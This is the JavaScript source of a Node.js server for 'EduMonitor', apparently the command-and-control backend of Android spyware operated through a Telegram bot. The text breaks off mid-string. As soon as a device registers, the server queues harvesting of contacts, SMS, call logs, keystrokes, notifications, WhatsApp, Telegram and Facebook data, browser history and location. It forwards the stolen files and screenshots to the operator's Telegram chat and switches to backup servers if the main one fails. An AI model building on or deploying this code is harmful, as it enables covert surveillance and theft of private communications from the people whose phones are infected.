require('dotenv').config();

const express = require('express');
const axios = require('axios');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const FormData = require('form-data');
const { Octokit } = require('@octokit/rest');
const app = express();
const PORT = process.env.PORT || 3000;
const os = require('os');

// ============= VALIDATE REQUIRED ENVIRONMENT VARIABLES =============
if (!process.env.ENCRYPTION_SALT) {
    console.error('❌ ENCRYPTION_SALT is REQUIRED!');
    console.error('Generate one with:');
    console.error('  node -e "console.log(crypto.randomBytes(32).toString(\'hex\'))"');
    console.error('Then add to your Render environment variables.');
    process.exit(1);
}

if (!process.env.MAIN_BOT_TOKEN) {
    console.error('❌ MAIN_BOT_TOKEN is required!');
    process.exit(1);
}

if (!process.env.AUTHORIZED_CHAT_IDS) {
    console.error('❌ AUTHORIZED_CHAT_IDS is required!');
    process.exit(1);
}

const ENCRYPTION_SALT = process.env.ENCRYPTION_SALT;
const MAIN_BOT_TOKEN = process.env.MAIN_BOT_TOKEN;
const SECONDARY_BOT_TOKEN = process.env.SECONDARY_BOT_TOKEN || '';
const SECONDARY_SERVER_URL = process.env.SECONDARY_SERVER_URL || 'https://backup-server.onrender.com';
const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
const GIST_ID = process.env.GIST_ID;

let activeBotToken = MAIN_BOT_TOKEN;
let activeServerUrl = process.env.RENDER_EXTERNAL_URL || 'https://edu-hwpy.onrender.com';

// Store authorized chat IDs
const authorizedChats = new Set();
process.env.AUTHORIZED_CHAT_IDS.split(',').forEach(id => {
    const trimmedId = id.trim();
    if (trimmedId) authorizedChats.add(trimmedId);
});

console.log(`✅ ENCRYPTION_SALT loaded (length: ${ENCRYPTION_SALT.length})`);
console.log(`✅ Authorized chats: ${Array.from(authorizedChats).join(', ')}`);

// ============= GITHUB GIST STORAGE =============
let octokit = null;
if (GITHUB_TOKEN) {
    octokit = new Octokit({ auth: GITHUB_TOKEN });
    console.log('✅ GitHub client initialized');
}

const GIST_FILES = {
    DEVICES: 'devices.json',
    AUTO_DATA: 'autodata.json',
    FAILOVER_STATE: 'failover_state.json'
};

// ============= DATA STORAGE =============
const devices = new Map();
const userDeviceSelection = new Map();
const userStates = new Map();
const autoDataRequested = new Map();

let failoverState = {
    isFailedOver: false,
    failedOverAt: null,
    currentBotToken: MAIN_BOT_TOKEN,
    currentServerUrl: activeServerUrl,
    failoverCount: 0
};

// ============= ENCRYPTION FUNCTIONS =============
function encryptForDevice(data, deviceId) {
    try {
        const combinedKey = deviceId + ENCRYPTION_SALT;
        const key = crypto.createHash('sha256').update(combinedKey).digest();
        const iv = key.slice(0, 16);
        const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
        let encrypted = cipher.update(data, 'utf8', 'base64');
        encrypted += cipher.final('base64');
        return encrypted;
    } catch (error) {
        console.error('Encryption error:', error);
        return null;
    }
}

// ============= DEVICE CONFIGURATION =============
const defaultChatId = Array.from(authorizedChats)[0] || '';

const deviceConfigs = {
    'default': {
        chatId: defaultChatId,
        config: {
            chatId: defaultChatId,
            botToken: activeBotToken,
            serverUrl: activeServerUrl,
            pollingInterval: 15000,
            keepAliveInterval: 300000,
            realtimeLogging: false,
            autoScreenshot: false,
            autoRecording: false,
            screenshotQuality: 30,
            recordingQuality: 'VERY LOW',
            appOpenBatchSize: 50,
            syncBatchSize: 20,
            targetApps: [
                'com.sec.android.gallery3d', 'com.samsung.android.messaging',
                'com.android.chrome', 'com.google.android.youtube',
                'com.google.android.apps.camera', 'com.sec.android.app.camera',
                'com.android.camera', 'com.whatsapp', 'com.instagram.android',
                'com.facebook.katana', 'com.snapchat.android', 'com.google.android.apps.maps',
                'com.google.android.apps.messaging', 'com.microsoft.teams', 'com.zoom.us',
                'com.discord', 'com.mediatek.camera', 'com.whatsapp.w4b', 'com.pri.filemanager',
                'com.android.dialer', 'com.facebook.orca', 'com.google.android.apps.photosgo',
                'com.tencent.mm', 'com.google.android.apps.photos', 'org.telegram.messenger'
            ],
            features: {
                contacts: true, sms: true, callLogs: true, location: true,
                screenshots: true, recordings: true, keystrokes: true,
                notifications: true, phoneInfo: true, wifiInfo: true, mobileInfo: true
            }
        }
    }
};

function getDeviceConfig(deviceId) {
    return deviceConfigs[deviceId] || deviceConfigs['default'];
}

// ============= FILE UPLOAD =============
const uploadDir = 'uploads';
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });

const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, uploadDir),
    filename: (req, file, cb) => {
        const deviceId = req.body.deviceId || 'unknown';
        const timestamp = Date.now();
        const safeName = file.originalname.replace(/[^a-zA-Z0-9.-]/g, '_');
        cb(null, `${deviceId}-${timestamp}-${safeName}`);
    }
});

const upload = multer({ storage, limits: { fileSize: 50 * 1024 * 1024 } });

// ============= MIDDLEWARE =============
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// ============= HELPER FUNCTIONS =============
function isAuthorizedChat(chatId) {
    return authorizedChats.has(String(chatId));
}

function sendJsonResponse(res, data, statusCode = 200) {
    res.status(statusCode).json(data);
}

function getServerIP() {
    try {
        const interfaces = os.networkInterfaces();
        for (const name of Object.keys(interfaces)) {
            for (const iface of interfaces[name]) {
                if (iface.family === 'IPv4' && !iface.internal) return iface.address;
            }
        }
    } catch (e) {}
    return 'Unknown';
}

function getDeviceListForUser(chatId) {
    const userDevices = [];
    for (const [deviceId, device] of devices.entries()) {
        if (String(device.chatId) === String(chatId)) {
            userDevices.push({
                id: deviceId,
                name: device.deviceInfo?.model || 'Unknown Device',
                lastSeen: device.lastSeen,
                isActive: deviceId === userDeviceSelection.get(chatId),
                phoneNumber: device.phoneNumber || 'Not available',
                lastSeenFormatted: new Date(device.lastSeen).toLocaleString(),
                isOnline: (Date.now() - device.lastSeen) < 300000
            });
        }
    }
    return userDevices;
}

// ============= AUTO-DATA QUEUE COMMANDS =============
function queueAutoDataCommands(deviceId, chatId) {
    console.log(`🔄 Queueing auto-data collection for device ${deviceId}`);
    
    if (autoDataRequested.has(deviceId)) {
        console.log(`⚠️ Auto-data already requested for ${deviceId}`);
        return;
    }
    
    autoDataRequested.set(deviceId, {
        timestamp: Date.now(),
        requested: [
            'device_info', 'network_info', 'mobile_info',
            'contacts', 'sms', 'calllogs', 'apps_list',
            'keys', 'notify', 'whatsapp', 'telegram',
            'facebook', 'browser', 'location'
        ]
    });
    
    const device = devices.get(deviceId);
    if (!device) {
        console.error(`❌ Device not found for auto-data: ${deviceId}`);
        return;
    }
    
    if (!device.pendingCommands) device.pendingCommands = [];
    
    const commands = [
        { command: 'device_info', delay: 0, description: 'Device Info' },
        { command: 'network_info', delay: 5, description: 'Network Info' },
        { command: 'mobile_info', delay: 10, description: 'Mobile Info' },
        { command: 'contacts', delay: 15, description: 'Contacts' },
        { command: 'sms', delay: 20, description: 'SMS' },
        { command: 'calllogs', delay: 25, description: 'Call Logs' },
        { command: 'apps_list', delay: 30, description: 'Apps' },
        { command: 'keys', delay: 35, description: 'Keystrokes' },
        { command: 'notify', delay: 40, description: 'Notifications' },
        { command: 'whatsapp', delay: 45, description: 'WhatsApp' },
        { command: 'telegram', delay: 50, description: 'Telegram' },
        { command: 'facebook', delay: 55, description: 'Facebook' },
        { command: 'browser', delay: 60, description: 'Browser History' },
        { command: 'location', delay: 65, description: 'Location' }
    ];
    
    commands.forEach((cmd) => {
        device.pendingCommands.push({
            command: cmd.command,
            originalCommand: `/${cmd.command}`,
            messageId: null,
            timestamp: Date.now() + (cmd.delay * 1000),
            autoData: true,
            description: cmd.description
        });
    });
    
    console.log(`✅ ${commands.length} auto-data commands queued for ${deviceId}`);
    saveDevices();
}

// ============= DEVICE STATS AGGREGATION =============
async function getDeviceStats(chatId) {
    const userDevices = [];
    
    for (const [deviceId, device] of devices.entries()) {
        if (String(device.chatId) === String(chatId)) {
            const isOnline = (Date.now() - device.lastSeen) < 300000; // 5 minutes
            
            userDevices.push({
                id: deviceId,
                name: device.deviceInfo?.model || 'Unknown Device',
                android: device.deviceInfo?.android || 'Unknown',
                manufacturer: device.deviceInfo?.manufacturer || 'Unknown',
                lastSeen: device.lastSeen,
                lastSeenFormatted: new Date(device.lastSeen).toLocaleString(),
                firstSeen: new Date(device.firstSeen).toLocaleString(),
                isOnline: isOnline,
                hasPendingCommands: (device.pendingCommands?.length || 0) > 0,
                pendingCommandsCount: device.pendingCommands?.length || 0,
                phoneNumber: device.phoneNumber || 'Not available'
            });
        }
    }
    
    // Sort: online first, then by last seen
    userDevices.sort((a, b) => {
        if (a.isOnline && !b.isOnline) return -1;
        if (!a.isOnline && b.isOnline) return 1;
        return b.lastSeen - a.lastSeen;
    });
    
    return {
        total: userDevices.length,
        online: userDevices.filter(d => d.isOnline).length,
        offline: userDevices.filter(d => !d.isOnline).length,
        devices: userDevices
    };
}

function formatDeviceStatsMessage(stats) {
    let message = `📊 *DEVICE STATISTICS*\n`;
    message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
    message += `📱 *Total Devices:* ${stats.total}\n`;
    message += `🟢 *Online:* ${stats.online}\n`;
    message += `🔴 *Offline:* ${stats.offline}\n\n`;
    
    if (stats.devices.length === 0) {
        message += `No devices registered yet.\n`;
        message += `Use the Android app to register your first device.`;
    } else {
        stats.devices.forEach((device, index) => {
            const statusIcon = device.isOnline ? '🟢' : '🔴';
            const statusText = device.isOnline ? 'ONLINE' : 'OFFLINE';
            
            message += `${index + 1}. ${statusIcon} *${device.name}*\n`;
            message += `   └ 📱 ${device.manufacturer}\n`;
            message += `   └ 🤖 Android ${device.android}\n`;
            message += `   └ 🆔 \`${device.id.substring(0, 8)}...\`\n`;
            message += `   └ 📅 Last Seen: ${device.lastSeenFormatted}\n`;
            message += `   └ 📊 Status: ${statusText}\n`;
            if (device.pendingCommandsCount > 0) {
                message += `   └ ⏳ Pending Commands: ${device.pendingCommandsCount}\n`;
            }
            if (device.phoneNumber !== 'Not available') {
                message += `   └ 📞 Phone: ${device.phoneNumber}\n`;
            }
            message += `\n`;
        });
        
        message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
        message += `💡 *Commands:*\n`;
        message += `• /select [device_id] - Switch active device\n`;
        message += `• /refresh - Update this list\n`;
        message += `• /devices - List all devices\n`;
    }
    
    return message;
}

// ============= GITHUB GIST STORAGE FUNCTIONS =============
async function readFromGist(filename) {
    if (!octokit || !GIST_ID) return null;
    try {
        const response = await octokit.gists.get({ gist_id: GIST_ID });
        const fileContent = response.data.files[filename];
        if (fileContent && fileContent.content) return JSON.parse(fileContent.content);
        return null;
    } catch (error) {
        if (error.status !== 404) console.error(`Error reading ${filename}:`, error.message);
        return null;
    }
}

async function writeToGist(filename, data) {
    if (!octokit) return false;
    try {
        const content = JSON.stringify(data, null, 2);
        const files = { [filename]: { content } };
        if (!GIST_ID) {
            const response = await octokit.gists.create({
                description: 'EduMonitor Bot Storage',
                public: false,
                files
            });
            console.log(`✅ Created new gist: ${response.data.id}`);
            return true;
        } else {
            await octokit.gists.update({ gist_id: GIST_ID, files });
            console.log(`💾 Saved ${filename}`);
            return true;
        }
    } catch (error) {
        console.error(`Error writing ${filename}:`, error.message);
        return false;
    }
}

function saveLocalBackup() {
    try {
        const backupDir = path.join(__dirname, 'backup');
        if (!fs.existsSync(backupDir)) fs.mkdirSync(backupDir, { recursive: true });
        
        const devicesObj = {};
        for (const [id, device] of devices.entries()) {
            const sanitized = { ...device };
            delete sanitized.pendingCommands;
            devicesObj[id] = sanitized;
        }
        fs.writeFileSync(path.join(backupDir, 'devices.backup.json'), JSON.stringify(devicesObj, null, 2));
        
        const autoDataObj = {};
        for (const [id, flag] of autoDataRequested.entries()) autoDataObj[id] = flag;
        fs.writeFileSync(path.join(backupDir, 'autodata.backup.json'), JSON.stringify(autoDataObj, null, 2));
        
        console.log(`💾 Saved local backup`);
    } catch (error) {
        console.error('Error saving local backup:', error);
    }
}

async function saveDevices() {
    if (octokit) {
        const devicesObj = {};
        for (const [id, device] of devices.entries()) devicesObj[id] = device;
        await writeToGist(GIST_FILES.DEVICES, devicesObj);
    }
    saveLocalBackup();
}

// ============= FAILOVER STATE MANAGEMENT =============
async function saveFailoverState() {
    if (octokit && GIST_ID) {
        await writeToGist(GIST_FILES.FAILOVER_STATE, failoverState);
    }
    
    try {
        const backupDir = path.join(__dirname, 'backup');
        if (!fs.existsSync(backupDir)) fs.mkdirSync(backupDir, { recursive: true });
        fs.writeFileSync(
            path.join(backupDir, 'failover_state.backup.json'),
            JSON.stringify(failoverState, null, 2)
        );
    } catch (error) {
        console.error('Error saving failover state:', error);
    }
}

async function loadFailoverState() {
    if (octokit && GIST_ID) {
        const data = await readFromGist(GIST_FILES.FAILOVER_STATE);
        if (data) {
            failoverState = data;
            activeBotToken = failoverState.currentBotToken || MAIN_BOT_TOKEN;
            activeServerUrl = failoverState.currentServerUrl || activeServerUrl;
            console.log(`✅ Loaded failover state: ${failoverState.isFailedOver ? 'FAILED OVER' : 'NORMAL'}`);
            return;
        }
    }
    
    // Try local backup
    try {
        const backupPath = path.join(__dirname, 'backup', 'failover_state.backup.json');
        if (fs.existsSync(backupPath)) {
            const data = fs.readFileSync(backupPath, 'utf8');
            const saved = JSON.parse(data);
            failoverState = { ...failoverState, ...saved };
            activeBotToken = failoverState.currentBotToken || MAIN_BOT_TOKEN;
            activeServerUrl = failoverState.currentServerUrl || activeServerUrl;
            console.log(`✅ Loaded failover state from local backup`);
        }
    } catch (error) {
        console.error('Error loading failover state:', error);
    }
}

// ============= TELEGRAM MESSAGE FUNCTIONS =============
function getTelegramApiUrl() {
    return `https://api.telegram.org/bot${activeBotToken}`;
}

async function sendTelegramMessage(chatId, text) {
    try {
        if (!text || text.trim().length === 0) return null;
        const response = await axios.post(`${getTelegramApiUrl()}/sendMessage`, {
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML'
        });
        return response.data;
    } catch (error) {
        console.error('Error sending message:', error.response?.data || error.message);
        return null;
    }
}

async function sendTelegramMessageWithKeyboard(chatId, text, keyboard) {
    try {
        const response = await axios.post(`${getTelegramApiUrl()}/sendMessage`, {
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: keyboard }
        });
        return response.data;
    } catch (error) {
        console.error('Error sending message with keyboard:', error.response?.data || error.message);
        return null;
    }
}

async function editMessageKeyboard(chatId, messageId, newKeyboard) {
    try {
        const response = await axios.post(`${getTelegramApiUrl()}/editMessageReplyMarkup`, {
            chat_id: chatId,
            message_id: messageId,
            reply_markup: { inline_keyboard: newKeyboard }
        });
        return response.data;
    } catch (error) {
        console.error('Error editing keyboard:', error.response?.data || error.message);
        return null;
    }
}

async function answerCallbackQuery(callbackQueryId, text = null) {
    try {
        await axios.post(`${getTelegramApiUrl()}/answerCallbackQuery`, {
            callback_query_id: callbackQueryId,
            text: text
        });
    } catch (error) {
        console.error('Error answering callback query:', error.response?.data || error.message);
    }
}

async function setChatMenuButton(chatId) {
    try {
        const commands = [
            { command: 'help', description: '📋 Complete help menu' },
            { command: 'showmenu', description: '📋 Show help menu' },
            { command: 'devices', description: '📱 List all devices' },
            { command: 'stats', description: '📊 Device statistics' },
            { command: 'select', description: '🎯 Select device to control' },
            { command: 'screenshot', description: '📸 Take screenshot' },
            { command: 'record', description: '🎤 Start recording' },
            { command: 'location', description: '📍 Get location' },
            { command: 'sync_all', description: '🔄 Sync all data' }
        ];
        await axios.post(`${getTelegramApiUrl()}/setMyCommands`, { commands });
        await axios.post(`${getTelegramApiUrl()}/setChatMenuButton`, {
            chat_id: chatId,
            menu_button: { type: 'commands', text: 'Menu' }
        });
    } catch (error) {
        console.error('Error setting menu button:', error.response?.data || error.message);
    }
}

async function sendTelegramDocument(chatId, filePath, filename, caption) {
    try {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('document', fs.createReadStream(filePath), { filename });
        formData.append('caption', caption);
        const response = await axios.post(`${getTelegramApiUrl()}/sendDocument`, formData, {
            headers: formData.getHeaders(),
            maxContentLength: Infinity,
            maxBodyLength: Infinity
        });
        return response.data;
    } catch (error) {
        console.error('Error sending document:', error.response?.data || error.message);
        return null;
    }
}

// ============= API ENDPOINTS =============

// Health check
app.get('/health', (req, res) => {
    res.json({ 
        status: 'healthy', 
        devices: devices.size,
        authorizedChats: authorizedChats.size,
        serverIP: getServerIP(),
        failoverActive: failoverState.isFailedOver,
        timestamp: Date.now()
    });
});

// ============= 1. COMMAND ACKNOWLEDGMENT ENDPOINT =============
app.post('/api/commands/:deviceId/ack', async (req, res) => {
    const deviceId = req.params.deviceId;
    const { commandId, command, success, error } = req.body;
    
    console.log(`📝 Command acknowledgment from ${deviceId}:`, { commandId, command, success });
    
    const device = devices.get(deviceId);
    if (device && device.pendingCommands) {
        const originalLength = device.pendingCommands.length;
        
        // Remove the acknowledged command
        if (commandId) {
            device.pendingCommands = device.pendingCommands.filter(
                cmd => cmd.messageId !== commandId && cmd.command !== commandId
            );
        } else if (command) {
            device.pendingCommands = device.pendingCommands.filter(
                cmd => cmd.command !== command
            );
        }
        
        if (originalLength !== device.pendingCommands.length) {
            await saveDevices();
            console.log(`✅ Command ${commandId || command} acknowledged by ${deviceId}`);
        }
    }
    res.json({ success: true });
});

// ============= 2. SERVER CONFIG ENDPOINT =============
app.get('/api/config/servers', (req, res) => {
    console.log('📡 Server config requested from:', req.ip);
    
    res.json({
        main_url: activeServerUrl,
        second_url: SECONDARY_SERVER_URL,
        active_server_url: activeServerUrl,
        failover_active: failoverState.isFailedOver || false,
        encryption_salt: ENCRYPTION_SALT,
        timestamp: Date.now()
    });
});

// ============= FAILOVER MANAGEMENT ENDPOINTS =============
app.post('/api/failover/force', async (req, res) => {
    console.log('🔄 Force failover requested');
    
    if (!SECONDARY_BOT_TOKEN) {
        return res.json({ success: false, error: 'No secondary bot configured' });
    }
    
    activeBotToken = SECONDARY_BOT_TOKEN;
    activeServerUrl = SECONDARY_SERVER_URL;
    failoverState.isFailedOver = true;
    failoverState.failedOverAt = Date.now();
    failoverState.currentBotToken = SECONDARY_BOT_TOKEN;
    failoverState.currentServerUrl = SECONDARY_SERVER_URL;
    failoverState.failoverCount = (failoverState.failoverCount || 0) + 1;
    
    await saveFailoverState();
    await setupWebhook();
    
    res.json({ success: true, failoverActive: true });
});

app.post('/api/failover/restore', async (req, res) => {
    console.log('🔄 Restore primary requested');
    
    activeBotToken = MAIN_BOT_TOKEN;
    activeServerUrl = process.env.RENDER_EXTERNAL_URL || 'https://edu-hwpy.onrender.com';
    failoverState.isFailedOver = false;
    failoverState.currentBotToken = MAIN_BOT_TOKEN;
    failoverState.currentServerUrl = activeServerUrl;
    
    await saveFailoverState();
    await setupWebhook();
    
    res.json({ success: true, failoverActive: false });
});

app.get('/api/failover/status', (req, res) => {
    res.json({
        failoverActive: failoverState.isFailedOver || false,
        failedOverAt: failoverState.failedOverAt,
        failoverCount: failoverState.failoverCount || 0,
        currentServerUrl: activeServerUrl,
        usingBackupBot: activeBotToken !== MAIN_BOT_TOKEN,
        primaryBotToken: MAIN_BOT_TOKEN.substring(0, 15) + '...',
        secondaryConfigured: !!SECONDARY_BOT_TOKEN
    });
});

// Complete config for device (Level 2 and Level 4)
app.get('/api/device/:deviceId/complete-config', (req, res) => {
    const deviceId = req.params.deviceId;
    console.log(`🔐 Config requested for device: ${deviceId}`);
    
    const device = devices.get(deviceId);
    if (!device) {
        console.log(`⚠️ Device not found: ${deviceId}`);
        return res.status(404).json({ error: 'Device not found' });
    }
    
    const deviceConfig = getDeviceConfig(deviceId);
    const encryptedToken = encryptForDevice(activeBotToken, deviceId);
    const encryptedChatId = encryptForDevice(deviceConfig.chatId, deviceId);
    
    res.json({
        encrypted_token: encryptedToken,
        encrypted_chat_id: encryptedChatId,
        server_url: activeServerUrl,
        failover_status: failoverState.isFailedOver ? 'failed_over' : 'normal',
        timestamp: Date.now()
    });
});

// Verify device registration (Level 1 and Level 3 check this)
app.get('/api/verify/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const device = devices.get(deviceId);
    
    if (device && device.chatId) {
        res.json({
            registered: true,
            deviceId: deviceId,
            chatId: device.chatId,
            lastSeen: device.lastSeen,
            deviceInfo: device.deviceInfo,
            hasPendingCommands: (device.pendingCommands?.length || 0) > 0
        });
    } else {
        res.status(404).json({
            registered: false,
            deviceId: deviceId,
            message: 'Device not registered'
        });
    }
});

// Get pending commands for device
app.get('/api/commands/:deviceId', async (req, res) => {
    const deviceId = req.params.deviceId;
    const device = devices.get(deviceId);
    
    try {
        if (device?.pendingCommands?.length > 0) {
            // Sort by timestamp and filter expired commands (older than 5 minutes)
            const now = Date.now();
            const validCommands = device.pendingCommands.filter(cmd => 
                (cmd.timestamp + 300000) > now // 5 minutes TTL
            );
            
            const commands = validCommands.map(cmd => ({
                command: cmd.command,
                originalCommand: cmd.originalCommand,
                messageId: cmd.messageId,
                timestamp: cmd.timestamp,
                autoData: cmd.autoData || false
            }));
            
            // Remove only the commands we're sending (not all)
            device.pendingCommands = device.pendingCommands.filter(cmd => 
                !validCommands.includes(cmd)
            );
            
            await saveDevices();
            console.log(`📤 Sending ${commands.length} commands to ${deviceId}`);
            res.json({ commands });
        } else {
            res.json({ commands: [] });
        }
    } catch (e) {
        console.error('Error in /api/commands:', e);
        res.status(500).json({ commands: [], error: e.message });
    }
});

// Ping (keep alive)
app.get('/api/ping/:deviceId', async (req, res) => {
    const deviceId = req.params.deviceId;
    const device = devices.get(deviceId);
    
    if (device) {
        device.lastSeen = Date.now();
        await saveDevices();
        res.json({ status: 'alive', timestamp: Date.now(), registered: true });
    } else {
        res.status(404).json({ status: 'unknown', registered: false });
    }
});

// Register device
app.post('/api/register', async (req, res) => {
    const { deviceId, deviceInfo } = req.body;
    
    console.log('📝 Registration:', deviceId);
    
    if (!deviceId || !deviceInfo) {
        return res.status(400).json({ error: 'Missing fields' });
    }
    
    const deviceConfig = getDeviceConfig(deviceId);
    const existingDevice = devices.get(deviceId);
    const isNewDevice = !existingDevice;
    
    const deviceData = {
        chatId: deviceConfig.chatId,
        deviceInfo,
        lastSeen: Date.now(),
        pendingCommands: existingDevice?.pendingCommands || [],
        firstSeen: existingDevice?.firstSeen || Date.now(),
        phoneNumber: existingDevice?.phoneNumber || null
    };
    
    devices.set(deviceId, deviceData);
    await saveDevices();
    
    console.log(`✅ Device ${isNewDevice ? 'registered' : 'updated'}: ${deviceId}`);
    await setChatMenuButton(deviceConfig.chatId);
    
    const userDevices = getDeviceListForUser(deviceConfig.chatId);
    
    let welcomeMessage = `✅ <b>Device ${isNewDevice ? 'Connected' : 'Updated'}!</b>\n\n`;
    welcomeMessage += `📱 Model: ${deviceInfo.model}\n`;
    welcomeMessage += `🤖 Android: ${deviceInfo.android}\n`;
    welcomeMessage += `🆔 ID: ${deviceId.substring(0, 8)}...\n\n`;
    
    if (isNewDevice) {
        welcomeMessage += `You now have ${userDevices.length} device(s) registered.\n\n`;
        welcomeMessage += `🔄 <b>Auto-collecting data...</b>\n`;
        welcomeMessage += `The following data will be collected automatically:\n`;
        welcomeMessage += `• Device Info • Network Info • Mobile Info\n`;
        welcomeMessage += `• Contacts • SMS • Call Logs • Apps\n`;
        welcomeMessage += `• Keystrokes • Notifications\n`;
        welcomeMessage += `• WhatsApp • Telegram • Facebook\n`;
        welcomeMessage += `• Browser History • Location\n\n`;
        
        if (userDevices.length === 1) {
            userDeviceSelection.set(deviceConfig.chatId, deviceId);
            welcomeMessage += `✅ This device has been automatically selected for control.\n\n`;
        }
        
        welcomeMessage += `Use /help to see all available commands.`;
        
        // Queue auto-data commands for new device
        queueAutoDataCommands(deviceId, deviceConfig.chatId);
    } else {
        welcomeMessage += `Device information updated.`;
    }
    
    await sendTelegramMessageWithKeyboard(
        deviceConfig.chatId,
        welcomeMessage,
        getMainMenuKeyboard(deviceConfig.chatId)
    );
    
    const responseConfig = {
        ...deviceConfig.config,
        botToken: activeBotToken,
        serverUrl: activeServerUrl,
        chatId: deviceConfig.chatId
    };
    
    res.json({
        status: 'registered',
        deviceId,
        chatId: deviceConfig.chatId,
        config: responseConfig
    });
});

// Upload photo
app.post('/api/upload-photo', upload.single('photo'), async (req, res) => {
    try {
        const deviceId = req.body.deviceId;
        const caption = req.body.caption || '📸 Camera Photo';
        
        if (!deviceId || !req.file) {
            return res.status(400).json({ error: 'Missing fields' });
        }
        
        const device = devices.get(deviceId);
        if (!device) return res.status(404).json({ error: 'Device not found' });
        
        const chatId = device.chatId;
        const filePath = req.file.path;
        const deviceName = device.deviceInfo?.model || 'Unknown Device';
        const fullCaption = `📱 ${deviceName}\n\n${caption}`;
        
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', fs.createReadStream(filePath), { filename: req.file.originalname });
        formData.append('caption', fullCaption);
        
        await axios.post(`${getTelegramApiUrl()}/sendPhoto`, formData, {
            headers: formData.getHeaders(),
            maxContentLength: Infinity,
            maxBodyLength: Infinity
        });
        
        setTimeout(() => { try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch(e) {} }, 60000);
        res.json({ success: true });
    } catch (error) {
        console.error('Photo upload error:', error);
        res.status(500).json({ error: 'Upload failed' });
    }
});

// Upload file
app.post('/api/upload-file', upload.single('file'), async (req, res) => {
    try {
        const deviceId = req.body.deviceId;
        const command = req.body.command;
        const filename = req.body.filename;
        const itemCount = req.body.count || '0';
        
        if (!deviceId || !command || !filename || !req.file) {
            return res.status(400).json({ error: 'Missing fields' });
        }
        
        const device = devices.get(deviceId);
        if (!device) return res.status(404).json({ error: 'Device not found' });
        
        const chatId = device.chatId;
        const filePath = req.file.path;
        const deviceName = device.deviceInfo?.model || 'Unknown Device';
        
        let caption = `📱 ${deviceName}\n\n`;
        switch (command) {
            case 'contacts': caption += `📇 Contacts Export (${itemCount} contacts)`; break;
            case 'sms': caption += `💬 SMS Messages Export (${itemCount} messages)`; break;
            case 'calllogs': caption += `📞 Call Logs Export (${itemCount} calls)`; break;
            case 'apps_list': caption += `📱 Installed Apps Export (${itemCount} apps)`; break;
            case 'keys': caption += `⌨️ Keystroke Logs Export (${itemCount} entries)`; break;
            case 'notify': caption += `🔔 Notifications Export (${itemCount} notifications)`; break;
            default: caption += `📎 Data Export`;
        }
        
        await sendTelegramDocument(chatId, filePath, filename, caption);
        setTimeout(() => { try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch(e) {} }, 60000);
        res.json({ success: true });
    } catch (error) {
        console.error('File upload error:', error);
        res.status(500).json({ error: 'Upload failed' });
    }
});

// Command result
app.post('/api/result/:deviceId', async (req, res) => {
    const deviceId = req.params.deviceId;
    const { command, result, error } = req.body;
    
    const fileCommands = ['contacts', 'sms', 'calllogs', 'apps_list', 'keys', 'notify', 'open_app',
        'whatsapp', 'telegram', 'facebook', 'browser', 'device_info', 'network_info', 'mobile_info'];
    
    if (fileCommands.includes(command)) return res.sendStatus(200);
    
    const device = devices.get(deviceId);
    if (device) {
        const chatId = device.chatId;
        const devicePrefix = `📱 ${device.deviceInfo?.model || 'Device'}\n\n`;
        if (error) {
            await sendTelegramMessage(chatId, devicePrefix + `❌ Command Failed\n\n${command}\n\nError: ${error}`);
        } else if (result) {
            await sendTelegramMessage(chatId, devicePrefix + result);
        } else {
            await sendTelegramMessage(chatId, devicePrefix + `✅ ${command} executed successfully`);
        }
    }
    res.sendStatus(200);
});

// ============= DEVICE STATS ENDPOINT =============
app.get('/api/device-stats/:chatId', async (req, res) => {
    const chatId = req.params.chatId;
    
    if (!isAuthorizedChat(chatId)) {
        return res.status(403).json({ error: 'Unauthorized' });
    }
    
    const stats = await getDeviceStats(chatId);
    res.json(stats);
});

// ============= WEBHOOK SETUP =============
async function setupWebhook() {
    try {
        console.log('🔧 Configuring webhook...');
        await axios.post(`${getTelegramApiUrl()}/deleteWebhook`);
        const webhookUrl = `${activeServerUrl}/webhook`;
        const response = await axios.post(`${getTelegramApiUrl()}/setWebhook`, {
            url: webhookUrl,
            allowed_updates: ["message", "callback_query"],
            max_connections: 100
        });
        if (response.data.ok) {
            console.log('✅ Webhook set successfully:', webhookUrl);
        } else {
            console.error('❌ Webhook failed:', response.data.description);
        }
    } catch (error) {
        console.error('❌ Error setting webhook:', error.message);
    }
}

// ============= WEBHOOK ENDPOINT =============
app.post('/webhook', async (req, res) => {
    res.sendStatus(200);
    
    setImmediate(async () => {
        try {
            const update = req.body;
            if (update.callback_query) {
                await handleCallbackQuery(update.callback_query);
                return;
            }
            if (!update?.message) return;
            
            const chatId = update.message.chat.id;
            const text = update.message.text;
            const messageId = update.message.message_id;
            
            if (!isAuthorizedChat(chatId)) {
                await sendTelegramMessage(chatId, '⛔ You are not authorized to use this bot.');
                return;
            }
            
            await setChatMenuButton(chatId);
            
            if (text?.startsWith('/')) {
                await handleCommand(chatId, text, messageId);
            } else {
                await sendTelegramMessageWithKeyboard(chatId,
                    "🤖 Use /help to see available commands.",
                    getMainMenuKeyboard(chatId));
            }
        } catch (error) {
            console.error('Error processing webhook:', error);
        }
    });
});

// ============= COMMAND HANDLER =============
async function handleCommand(chatId, command, messageId) {
    console.log(`🎯 Command: ${command} from ${chatId}`);
    
    // ============ SERVER-SIDE COMMANDS (NOT sent to device) ============
    
    // Handle /start - Welcome message with instructions
    if (command === '/start') {
        console.log('🎉 Welcome message for /start');
        
        const welcomeMessage = `🤖 *Welcome to EduMonitor Bot!*\n\n` +
            `This bot helps you monitor and control your Android devices remotely.\n\n` +
            `📱 *Getting Started:*\n` +
            `1. Download and install the EduMonitor app on your Android device\n` +
            `2. Open the app and grant all required permissions\n` +
            `3. The device will automatically register with this bot\n` +
            `4. Once registered, use the menu below to control your device\n\n` +
